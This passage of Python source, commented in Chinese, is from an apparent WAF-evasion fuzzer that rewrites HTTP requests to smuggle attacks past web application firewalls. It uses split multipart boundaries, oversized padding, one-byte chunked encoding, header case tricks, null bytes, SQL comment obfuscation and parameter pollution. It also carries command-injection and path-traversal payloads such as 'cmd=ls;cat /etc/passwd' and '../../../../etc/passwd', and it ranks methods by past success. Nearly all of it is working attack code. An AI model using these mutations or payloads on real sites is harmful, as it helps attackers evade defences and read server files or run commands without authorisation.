                point1 = random.randint(1, len(poc) - 2)
                point2 = random.randint(point1 + 1, len(poc) - 1)
                part = []
                part.append(poc[:point1])
                part.append(poc[point1:point2])
                part.append(poc[point2:])
                for i in range(3):
                    plt_data += pera + "=" + part[i] + "\n"
            if ":" in data:

                pera = data.split(":")[0]
                poc = data.split(":")[1]
                point1 = random.randint(1, len(poc) - 2)
                point2 = random.randint(point1 + 1, len(poc) - 1)
                part = []
                part.append(poc[:point1])
                part.append(poc[point1:point2])
                part.append(poc[point2:])
                for i in range(3):
                    plt_data += pera + ":" + part[i] + "\n"
            # print(plt_data)

        else:
            plt_data = data
            # pera=data.keys()
            # for pera in list(data.keys()):
            #     poc=data[pera]

        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': plt_data,
            'files': files
        })
    else:
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
        # 为每个参数创建重复的测试用例
        for param, values in query_params.items():
            original_value = values[0]

            # 构造重复参数
            duplicate_params = []

            for _ in range(3):  # 创建3个重复参数
                duplicate_params.append((param, "1"))

            duplicate_params.append((param, original_value))
            # 添加其他原始参数
            for other_param, other_values in query_params.items():
                if other_param != param:
                    duplicate_params.append((other_param, other_values[0]))

            # 构造新的查询字符串
            query_string = '&'.join(f"{p}={v}" for p, v in duplicate_params)
            test_url = f"{base_url}?{query_string}"

            mutant_payloads.append({
                'headers': headers,
                'url': test_url,
                'method': method,
                'data': data,
                'files': files
            })

    logger.debug(TAG + "==>mutant_payloads: " + str(mutant_payloads))
    # print(mutant_payloads)
    # input("")
    return mutant_payloads


def mutant_methods_multipart_boundary(headers, url, method, data, files):
    """ 对 boundary 进行变异进而绕过"""
    logger.info(TAG + "==>mutant_methods_multipart_boundary")
    logger.debug(TAG + "==>headers: " + str(headers))
    # 只有 multipart/form-data 才需要可以使用这个方法

    content_type = headers.get('Content-Type')
    if not content_type or not re.match('multipart/form-data', content_type):
        if not 'filename' in str(data):
            return []
    if not isinstance(data, str):
        data_str = data.decode()
    else:
        data_str = data
    pattern = re.compile(r'Content-Disposition: form-data;.*filename="([^"]+)"')
    filenames = pattern.findall(data_str)

    # 从Content-Type中解析boundary的正则表达式
    pattern = re.compile(r'boundary=(.*)')
    match = pattern.search(content_type)
    if match:
        boundary = match.group(1)
        logger.debug(TAG + f"Found boundary: {boundary}")
    else:
        # 无boundary
        logger.info(TAG + "No boundary found in Content-Type")
        return []

    # 拼接后为----realBoundary
    boundary0 = '----real'
    boundary1 = 'Boundary'
    mutant_payloads = []
    # 基于 RFC 2231 的boundary构造
    content_type += f'; boundary*0={boundary0}; boundary*1={boundary1}'

    # 构造新的header
    headers.update({'Content-Type': content_type})
    # 构造请求体，第一种是go的解析方式，第二种是flask的解析方式
    # waf解析的边界
    fake_body = f'--{boundary}\r\n'
    fake_body += f'Content-Disposition: form-data; name="field1"\r\n\r\n'
    fake_body += f'fake data\r\n'
    fake_body += f'--{boundary}--\r\n'

    # 真正的源站解析的边界
    real_body = ['', '']
    for filename in filenames:
        real_body[0] += f'--{boundary0}{boundary1}\r\n'
        real_body[0] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[0] += f'Content-Type: text/plain\r\n\r\n'
        real_body[0] += f'real data\r\n'
    real_body[0] += f'--{boundary0}{boundary1}--\r\n'

    for filename in filenames:
        real_body[1] += f'--{boundary}{boundary0}{boundary1}\r\n'
        real_body[1] += f'Content-Disposition: form-data; name="field2"; filename="{filename}"\r\n'
        real_body[1] += f'Content-Type: text/plain\r\n\r\n'
        real_body[1] += f'real data\r\n'
    real_body[1] += f'--{boundary}{boundary0}{boundary1}--\r\n'

    for body in real_body:
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data_str + body
        })
    return mutant_payloads


# 资源限制角度绕过WAF
# 超大数据包绕过
# 这是众所周知、而又难以解决的问题。如果HTTP请求POST BODY太大，检测所有的内容，WAF集群消耗太大的CPU、内存资源。因此许多WAF只检测前面的
# 几K字节、1M、或2M。对于攻击者而然，只需要在POST BODY前面添加许多无用数据，把攻击payload放在最后即可绕过WAF检测。
def mutant_methods_add_padding(headers, url, method, data, files):
    """ 绕过WAF的超大数据包检测"""
    logger.info(TAG + "==>mutant_methods_add_padding")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 对于上传请求，在headers中添加无用数据
    if files:
        padding_data = 'x' * 1024 * 1
        for name, file_info in files.items():
            file_content = file_info.get('content', '')
            file_info['content'] = padding_data + file_content
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
        return mutant_payloads
    padding_data = 'x' * 1024 * 1  # 5 kB 的无用数据
    # data must not be a string
    if isinstance(data, bytes) and isinstance(padding_data, str):
        padding_data = padding_data.encode()  # 将 padding_data 转换为字节串
    if isinstance(data, dict):
        from urllib.parse import urlencode
        data = urlencode(data)
    if data:
        data += padding_data
    else:
        data = padding_data

    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    return mutant_payloads


# 删除data中的Content-Type
def mutant_methods_delete_content_type_of_data(headers, url, method, data, files):
    """ 删除data中的Content-Type:xxx; """
    logger.info(TAG + "==>mutant_methods_delete_content_type_of_data")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    # 只有 multipart/form-data 才需要可以使用这个方法
    content_type = headers.get('Content-Type')
    if content_type and re.match('multipart/form-data', content_type):
        pattern = r'Content-Type:[^;]+;\s*'
        # 使用re.sub()函数来删除所有匹配的部分
        if not isinstance(data, str):
            data_str = data.decode()
        else:
            data_str = data
        cleaned_data = re.sub(pattern, '', data_str)
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': cleaned_data
        })
    return mutant_payloads


# 请求头变异,改变Content-Type的大小写
def mutant_methods_modify_content_type_case(headers, url, method, data, files):
    """ 变异Content-Type的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_content_type_case")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        headers['Content-Type'] = headers['Content-Type'].upper()
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads


# 请求头变异，改变Content-Type这个属性名本身的大小写
def mutant_methods_modify_case_of_content_type(headers, url, method, data, files):
    """ 变异Content-Type这个属性名本身的大小写"""
    logger.info(TAG + "==>mutant_methods_modify_case_of_content_type")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if 'Content-Type' in headers:
        new_content_type = headers.pop('Content-Type')
        headers['content-type'] = new_content_type
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads


def mutant_methods_add_Content_Type_for_get_request(headers, url, method, data, files):
    """ 给GET请求添加Content-Type"""
    logger.info(TAG + "==>mutant_methods_add_Content_Type_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads


# 为形如/rce_get?cmd=cat%20/etc/passwd的GET请求添加无害命令，如cmd=ls;cat%20/etc/passwd
def mutant_methods_add_harmless_command_for_get_request(headers, url, method, data, files):
    """ 为GET请求添加无害命令"""
    logger.info(TAG + "==>mutant_methods_add_harmless_command_for_get_request")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []

    if method == 'GET':
        if 'cmd' in url:
            url = url.replace('cmd=', 'cmd=ls;')
        mutant_payloads.append({
            'headers': headers,
            'url': url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads


'''分块传输绕过
分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许数据分为多个部分，仅在HTTP/1.1中提供。
长度值为十六进制，也可以通过在长度值后面加上分号做注释，来提高绕过WAF的概率
条件
需要在请求头添加 “Transfer-Encoding=chunked” 才支持分块传输'''


def mutant_methods_chunked_transfer_encoding(headers, url, method, data, files):
    """ 使用分块传输编码，并将请求体拆分为更细的块 """
    logger.info(TAG + "==>mutant_methods_chunked_transfer_encoding")
    mutant_payloads = []

    # 仅在HTTP/1.1中支持分块传输编码
    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = headers.copy()
        mutated_headers['Transfer-Encoding'] = 'chunked'
        if 'Content-Length' in mutated_headers:
            del mutated_headers['Content-Length']
        # 确保使用HTTP/1.1版本
        mutated_headers['Protocol-Version'] = 'HTTP/1.1'

        # 构造分块传输编码的请求体
        def chunked_body(data):
            body = ''
            if data:
                if isinstance(data, dict):
                    from urllib.parse import urlencode
                    data = urlencode(data)
                data = data if isinstance(data, str) else data.decode('utf-8')
                # 将数据拆分为更细的块，例如每个块1个字符
                chunk_size = 1  # 每个块的大小，可以调整为更小的值
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i + chunk_size]
                    chunk_length = format(len(chunk), 'x')
                    # 可选择在长度值后添加注释
                    chunk_length_with_comment = chunk_length + ";"
                    body += chunk_length_with_comment + "\r\n"
                    body += chunk + "\r\n"
            # 添加结束块
            body += "0\r\n\r\n"
            return body

        mutated_data = chunked_body(data)

        mutant_payloads.append({
            'headers': mutated_headers,
            'url': url,
            'method': method,
            'data': mutated_data,
            'files': files
        })
    return mutant_payloads


# 把content-type的值替换为multipart/form-data当作一个载荷
def mutant_methods_multipart_form_data(headers, url, method, data, files):
    """ 使用multipart/form-data编码发送普通参数，并可选添加charset参数 """
    logger.info(TAG + "==>mutant_methods_multipart_form_data")
    mutant_payloads = []

    if method in ['POST', 'PUT', 'PATCH']:
        mutated_headers = copy.deepcopy(headers)

        # 生成随机的boundary
        boundary = '----WebKitFormBoundary' + uuid.uuid4().hex[:16]
        # 可选地在Content-Type后添加charset参数
        charset_options = ['', ', charset=ibm500', ', charset=ibm037']

        for charset in charset_options:
            content_type = f'multipart/form-data; boundary={boundary}{charset}'
            mutated_headers['Content-Type'] = content_type

            # 构造multipart/form-data请求体
            multipart_data = ''
            if data:
                if isinstance(data, dict):
                    for name, value in data.items():
                        multipart_data += f'--{boundary}\r\n'
                        multipart_data += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                        multipart_data += f'{value}\r\n'
                elif isinstance(data, str):
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="data"\r\n\r\n'
                    multipart_data += f'{data}\r\n'
            if files:
                for name, file_info in files.items():
                    filename = file_info.get('filename', 'file.txt')
                    file_content = file_info.get('content', '')
                    multipart_data += f'--{boundary}\r\n'
                    multipart_data += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'
                    multipart_data += f'Content-Type: application/octet-stream\r\n\r\n'
                    multipart_data += f'{file_content}\r\n'
            # 添加结束boundary
            multipart_data += f'--{boundary}--\r\n'

            # 更新Content-Length
            mutated_headers['Content-Length'] = str(len(multipart_data))

            mutant_payloads.append({
                'headers': mutated_headers,
                'url': url,
                'method': method,
                'data': multipart_data,
                'files': None  # 已经在multipart_data中处理
            })
    return mutant_payloads


def mutant_methods_sql_comment_obfuscation(headers, url, method, data, files):
    logger.info(TAG + "==> mutant_methods_sql_comment_obfuscation")
    logger.debug(TAG + "==>headers: " + str(headers))

    mutant_payloads = []
    if method == 'GET':
        obfuscated_url = url.replace(" ", "/**/").replace("%20", "/**/")
        mutant_payloads.append({
            'headers': headers,
            'url': obfuscated_url,
            'method': method,
            'data': data,
            'files': files
        })

    return mutant_payloads


def mutant_methods_convert_get_to_post(headers, url, method, data, files):
    # mutant_payloads = []
    # return mutant_payloads
    """ 将GET请求转换为POST请求 """
    logger.info(TAG + "==>mutant_methods_convert_get_to_post")
    logger.debug(TAG + "==>headers: " + str(headers))
    mutant_payloads = []
    if method == 'GET':
        # 将GET请求转换为POST请求
        method = 'POST'
        # 提取GET请求的参数
        query = urllib.parse.urlparse(url).query
        url = url.split('?')[0]
        url = url.replace('get', 'post')
        data = {'cmd': 'cat /etc/passwd'}
        # add htest parameters to headers
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers.pop('Content-Type', None)
        # 将GET请求的参数添加到data中
        # data = urllib.parse.urlencode(data)
    mutant_payloads.append({
        'headers': headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    return mutant_payloads


def mutant_methods_mutate_headers(headers, url, method, data, files):
    mutant_payloads = []
    new_headers = headers.copy()
    # 随机删除一个请求头
    if headers and random.random() < 0.2:
        key_to_remove = random.choice(list(headers.keys()))
        del new_headers[key_to_remove]
    # 随机添加一个请求头
    if random.random() < 0.2:
        new_key = 'X-' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        new_value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
        new_headers[new_key] = new_value
    # 变异请求头的值
    for key in new_headers:
        if random.random() < 0.3:
            new_headers[key] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=len(new_headers[key])))

    mutant_payloads.append({
        'headers': new_headers,
        'url': url,
        'method': method,
        'data': data,
        'files': files
    })
    return mutant_payloads

def get_weighted_mutant_methods(mutant_methods_config):
    memory_file_path = "config/memory.json"
    method_counter = Counter()
    global mutant_methods
    logger.debug(TAG + " ==> mutant_methods before weighted: " + str(mutant_methods))

    # 检查 memory.json 文件是否存在
    if os.path.exists(memory_file_path):
        with open(memory_file_path, "r") as f:
            try:
                memories = json.load(f)
            except json.decoder.JSONDecodeError:
                memories = {}

        # 遍历每个 URL 的成功方法，统计每个 mutant_method 的出现次数
        for url, methods in memories.items():
            method_counter.update(methods)

    logger.debug(TAG + " ==> method_counter: " + str(method_counter))

    # 从 mutant_methods_config 获取启用的 mutant_methods，包含方法名和函数对象
    enabled_methods = [
        (method_name, func) for method_name, (func, enabled) in mutant_methods_config.items()
        if enabled
    ]

    # 按出现次数进行排序，出现次数多的优先
    enabled_methods.sort(key=lambda x: method_counter[x[0]], reverse=True)

    # 更新 mutant_methods 仅包含排序后的函数对象
    mutant_methods = [func for _, func in enabled_methods]

    logger.debug(TAG + " ==> mutant_methods after weighted: " + str(mutant_methods))

    return mutant_methods

def mutant_methods_null_byte_injection(headers, url, method, data, files):
    """
    在 URL 和参数中插入 %00（null byte）以尝试绕过解析逻辑
    """
    logger.info(TAG + "==>mutant_methods_null_byte_injection")
    mutant_payloads = []

    parsed_url = urllib.parse.urlparse(url)
    null_byte_query = parsed_url.query.replace("=", "%00=")
    mutated_url = urllib.parse.urlunparse(parsed_url._replace(query=null_byte_query))

    mutated_data = data
    if isinstance(data, str):
        mutated_data = data.replace("=", "%00=")

    mutant_payloads.append({
        'headers': headers,
        'url': mutated_url,
        'method': method,
        'data': mutated_data,
        'files': files
    })
    return mutant_payloads

def mutant_methods_path_traversal(headers, url, method, data, files):
    """
    对 URL 的 path 注入路径穿越 payload
    """
    logger.info(TAG + "==>mutant_methods_path_traversal")
    mutant_payloads = []

    parsed_url = urllib.parse.urlparse(url)
    traversal_payloads = ['../../../../etc/passwd', '..%2f..%2fetc%2fpasswd']
    
    for payload in traversal_payloads:
        new_path = f"{parsed_url.path}/{payload}"
        mutated_url = urllib.parse.urlunparse(parsed_url._replace(path=new_path))
        mutant_payloads.append({
            'headers': headers,
            'url': mutated_url,
            'method': method,
            'data': data,
            'files': files
        })
    return mutant_payloads

def mutant_methods_random_boundary_confusion(headers, url, method, data, files):
    """
    为 multipart/form-data 设置异常的 boundary 值来尝试绕过解析逻辑
    """
    logger.info(TAG + "==>mutant_methods_random_boundary_confusion")
    mutant_payloads = []

    if 'multipart/form-data' in headers.get('Content-Type', ''):
        mutated_headers = copy.deepcopy(headers)
        random_boundary = 'AaB03x' + ''.join(random.choices("abcdef0123456789", k=8))
        mutated_headers['Content-Type'] = f'multipart/form-data; boundary="{random_boundary}"'

        if isinstance(data, bytes):
            data = data.decode()

        if isinstance(data, str):
            mutated_data = data.replace('--' + random_boundary, '--' + random_boundary.upper())
        else:
            mutated_data = data

        mutant_payloads.append({
            'headers': mutated_headers,
            'url': url,
            'method': method,
            'data': mutated_data,
            'files': files
        })

    return mutant_payloads


'''
ALL MUTANT METHODS:
mutant_methods_modify_content_type
mutant_methods_fake_content_type
mutant_methods_case_switching
mutant_methods_url_encoding
mutant_methods_unicode_normalization
mutant_methods_line_breaks
mutant_methods_add_padding
mutant_methods_multipart_boundary
mutant_upload_methods_double_equals
mutant_methods_delete_content_type_of_data
mutant_methods_modify_content_type_case
mutant_methods_modify_case_of_content_type
mutant_methods_add_Content_Type_for_get_request
mutant_methods_add_harmless_command_for_get_request
mutant_methods_chunked_transfer_encoding
mutant_methods_multipart_form_data
mutant_methods_sql_comment_obfuscation
mutant_methods_convert_get_to_post
mutant_methods_perameter_pollution_case1
mutant_methods_perameter_pollution_case2
mutant_methods_fake_IP
mutant_methods_change_charset
mutant_methods_add_accept_charset
mutant_methods_change_extensions
mutant_methods_transform_SOAP
mutant_methods_space_obfuscation
mutant_methods_upper_obfuscation
mutant_methods_unicode_obfuscation
mutant_methods_html_obfuscation
mutant_methods_double_decode_obfuscation
mutant_methods_newline_obfuscation
mutant_methods_tab_obfuscation
mutant_methods_garbage_character_obfuscation
mutant_methods_mutate_headers
mutant_methods_add_random_harmless_param
mutant_methods_modify_user_agent
'''
# 为变异方法添加开关
mutant_methods_config = {
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, True),
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, True),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, True),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, True),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, True),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, True),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, True),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, True),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, True),
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
    "mutant_methods_perameter_pollution_case1": (mutant_methods_perameter_pollution_case1, True),
    "mutant_methods_perameter_pollution_case2": (mutant_methods_perameter_pollution_case2, True),
    "mutant_methods_fake_IP": (mutant_methods_fake_IP, True),
    "mutant_methods_change_charset": (mutant_methods_change_charset, True),
    "mutant_methods_add_accept_charset": (mutant_methods_add_accept_charset, True),
    "mutant_methods_change_extensions": (mutant_methods_change_extensions, True),
    "mutant_methods_transform_SOAP": (mutant_methods_transform_SOAP, False),
    "mutant_methods_space_obfuscation": (mutant_methods_space_obfuscation, True),
    "mutant_methods_upper_obfuscation": (mutant_methods_upper_obfuscation, True),
    "mutant_methods_unicode_obfuscation": (mutant_methods_unicode_obfuscation, True),
    "mutant_methods_html_obfuscation": (mutant_methods_html_obfuscation, True),
    "mutant_methods_double_decode_obfuscation": (mutant_methods_double_decode_obfuscation, True),
    "mutant_methods_newline_obfuscation": (mutant_methods_newline_obfuscation, True),
    "mutant_methods_tab_obfuscation": (mutant_methods_tab_obfuscation, True),
    "mutant_methods_garbage_character_obfuscation": (mutant_methods_garbage_character_obfuscation, True),
    "mutant_methods_mutate_headers": (mutant_methods_mutate_headers, True),
    "mutant_methods_add_random_harmless_param": (mutant_methods_add_random_harmless_param, False),
    "mutant_methods_modify_user_agent": (mutant_methods_modify_user_agent, False)
}

# 为变异方法添加开关
mutant_methods_config_for_rl = {
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, True),
    "mutant_methods_modify_content_type_for_rl": (mutant_methods_modify_content_type_for_rl, True),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, False),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding, True),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, True),  # disabled for RL
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, True),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, False),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, True),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, False),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, False),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, True),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, False),  # disabled for RL
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
    "mutant_methods_add_random_harmless_param": (mutant_methods_add_random_harmless_param, False),
    "mutant_methods_modify_user_agent": (mutant_methods_modify_user_agent, False),
}

deep_mutant_methods_config = {
    "mutant_methods_modify_content_type": (mutant_methods_modify_content_type, False),
    "mutant_methods_fake_content_type": (mutant_methods_fake_content_type, False),
    "mutant_methods_case_and_comment_obfuscation": (mutant_methods_case_and_comment_obfuscation, False),
    "mutant_methods_url_encoding": (mutant_methods_url_encoding, False),
    "mutant_methods_unicode_normalization": (mutant_methods_unicode_normalization, False),
    "mutant_methods_line_breaks": (mutant_methods_line_breaks, False),
    "mutant_methods_add_padding": (mutant_methods_add_padding, False),
    "mutant_methods_multipart_boundary": (mutant_methods_multipart_boundary, False),
    "mutant_upload_methods_double_equals": (mutant_upload_methods_double_equals, False),
    "mutant_methods_delete_content_type_of_data": (mutant_methods_delete_content_type_of_data, False),
    "mutant_methods_modify_content_type_case": (mutant_methods_modify_content_type_case, False),
    "mutant_methods_modify_case_of_content_type": (mutant_methods_modify_case_of_content_type, False),
    "mutant_methods_add_Content_Type_for_get_request": (mutant_methods_add_Content_Type_for_get_request, False),
    "mutant_methods_add_harmless_command_for_get_request": (mutant_methods_add_harmless_command_for_get_request, False),
    "mutant_methods_chunked_transfer_encoding": (mutant_methods_chunked_transfer_encoding, False),
    "mutant_methods_multipart_form_data": (mutant_methods_multipart_form_data, False),
    "mutant_methods_sql_comment_obfuscation": (mutant_methods_sql_comment_obfuscation, False),
    "mutant_methods_convert_get_to_post": (mutant_methods_convert_get_to_post, False),
    "mutant_methods_change_request_method": (mutant_methods_change_request_method, True),
    "mutant_methods_modify_user_agent": (mutant_methods_modify_user_agent, False),
    "mutant_methods_add_random_harmless_param": (mutant_methods_add_random_harmless_param, False),
}


# 生成两两组合的变异方法
def generate_combinations(mutant_methods):
    """ 生成两两组合的变异方法 """
    return list(itertools.combinations(mutant_methods, 2))


if __name__ == '__main__':
    # 初始化启用的变异方法
    mutant_methods = [
        method for method, enabled in mutant_methods_config.values()
        if enabled
    ]
    # 权重计算是否已经进行
    weight_calculated = False
    if not weight_calculated:
        logger.info(TAG + "==>Calculating weights for mutant methods")
        mutant_methods = get_weighted_mutant_methods(mutant_methods_config)
        weight_calculated = True

    # 构建一个函数名称到函数的映射
    mutant_methods_map = {
        method.__name__: method
        for method in mutant_methods
    }

    disabled_mutant_methods = [
        method for method, enabled in mutant_methods_config.values()
        if not enabled
    ]
    # convert GET to POST
    deep_mutant_methods = [
        method for method, enabled in deep_mutant_methods_config.values()
        if enabled
    ]
    # 测试变异方法
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    url = 'http://example.com/get?cmd=cat%20/etc/passwd'
    method = 'GET'
    data = 'cmd=cat /etc/passwd'
    files = None
    # 测试两两组合的变异方法
    combinations = generate_combinations(mutant_methods)
    mutant_payloads = []
    for method1, method2 in combinations:
        mutant_payloads_generated_by_method_1 = method1(headers, url, method, data, files)
        for mutant_payload in mutant_payloads_generated_by_method_1:
            sub_mutant_payloads_generated_by_method_2 = method2(mutant_payload['headers'], mutant_payload['url'],
                                                                mutant_payload['method'], mutant_payload['data'],
                                                                mutant_payload['files'])
            mutant_payloads.extend(sub_mutant_payloads_generated_by_method_2)
        print(json.dumps(mutant_payloads, indent=4))
